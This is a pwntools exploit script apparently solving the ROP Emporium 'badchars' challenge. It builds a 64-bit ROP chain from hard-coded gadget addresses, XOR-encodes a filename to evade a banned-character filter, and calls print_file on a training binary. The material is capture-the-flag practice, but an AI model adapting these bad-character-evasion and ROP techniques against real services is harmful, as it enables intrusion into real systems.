from typing import Tuple

from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *print_file
b *pwnme+150
b *pwnme+266
continue
""".format(
    **locals()
)

# Binary filename
exe = "./badchars"
# exe = "./badchars32"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux splitw -h".split(" ")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


MOV_R12_R13 = 0x0000000000400634  # mov qword ptr [r13], r12 ; ret
POP_RDI = 0x00000000004006A3  # pop rdi ; ret
POP_RSI_R15 = 0x00000000004006A1  # pop rsi ; pop r15 ; ret
POP_R14_POP_R15 = 0x00000000004006A0  # pop r14 ; pop r15 ; ret
POP_R12_R13_R14_R15 = 0x000000000040069C  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
writable_data_section = 0x0000000000601028
XOR_R15_BY_R14 = 0x0000000000400628  # xor byte ptr [r15], r14b ; ret
XOR_RDI_DH = 0x0000000000400629  # xor byte ptr [rdi], dh ; ret $rdx
PUSH_RBP_MOV_RSP_RBP_POP_RBP = (
    0x0000000000400600  # push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
)
POP_R15 = 0x00000000004006A2  # pop r15 ; ret
# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Build the payload


def xor_payload(payload):
    banned_words = [b"x", b"g", b"a", b"."]
    for i in range(0xFF):
        xored_payload = b""
        found = True
        for j in range(len(payload)):
            xored_char = xor(payload[j], i)
            if xored_char in banned_words:
                found = False
                break
            xored_payload += xored_char
            continue
        if found:
            return xored_payload, i


def write_address(xorkey, where, offset):
    payload = p64(POP_R14_POP_R15)
    payload += p64(xorkey)
    payload += p64(writable_data_section + offset)
    payload += p64(XOR_R15_BY_R14)
    return payload


XORKEY = 2

# 64
payload = flat(
    {
        offset: [
            elf.search(asm("ret")).__next__(),
            p64(POP_R12_R13_R14_R15),
            b"fflce,tz",
            p64(writable_data_section),
            p64(XORKEY),
            p64(writable_data_section + 3),
            p64(MOV_R12_R13),
            p64(XOR_R15_BY_R14),
            write_address(XORKEY, writable_data_section, 4),
            write_address(XORKEY, writable_data_section, 5),
            write_address(XORKEY, writable_data_section, 7),
            write_address(116, writable_data_section, 8),  # Write T
            p64(POP_RDI),
            p64(writable_data_section + 1),
            elf.search(asm("ret")).__next__(),
            elf.plt["print_file"],
        ]
    }
)

# 32
# payload = flat({offset: [elf.sym["ret2win"]]})

# Send the payload
io.sendlineafter(b"> ", payload)
io.recvuntil(b"Thank you!")

# Got Shell?
io.interactive()
